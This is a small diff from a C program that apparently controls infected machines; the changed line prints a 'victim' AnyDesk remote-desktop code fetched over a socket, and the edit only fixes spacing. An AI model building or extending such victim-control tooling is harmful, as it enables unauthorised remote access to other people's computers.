@@ -144,7 +144,7 @@ void processCommand(char *command)
         }
 
         char *code = getCode(selectedVictimSocket);
-        printf("Victim anydesk code: %s" ,code);
+        printf("Victim anydesk code: %s", code);
         free(code);
     }
     else if (strcmp(command, "po") == 0)
